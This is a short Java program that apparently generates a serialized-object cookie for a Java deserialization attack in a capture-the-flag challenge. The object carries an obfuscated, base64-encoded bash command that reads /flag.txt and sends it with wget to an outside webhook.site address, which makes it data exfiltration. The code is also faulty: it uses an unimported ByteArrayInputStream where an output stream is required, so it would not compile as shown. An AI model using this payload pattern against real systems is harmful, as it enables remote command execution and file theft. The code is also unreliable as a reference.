import com.yogosha.utils.MissionDebug;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.util.Base64;

public class Main {
    public static void main(String[] args) {
        // create new obj
        MissionDebug debug = new MissionDebug("bash -c {echo,c2ggLWMgJEB8c2ggLiBlY2hvIHdnZXQgaHR0cHM6Ly93ZWJob29rLnNpdGUvNGIwNjdkMWUtZDhiNi00NWRmLTkwZWMtMDMzZTBmMjE1YzgyP2E9JChjYXQgL2ZsYWcudHh0fGJhc2U2NHx0ciAtZCBcIlxuXCIp}|{base64,-d}|{bash,-i}");
        String cookie = null;

        // serialise obj
        ByteArrayInputStream bos = new ByteArrayInputStream();
        ObjectOutputStream out = null;

        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(debug);
            out.close();

            cookie = Base64.getEncoder().encodeToString(bos.toByteArray());
            System.out.println(cookie);

        } catch (IOException e) {
            System.out.println(e);
        }
    }
}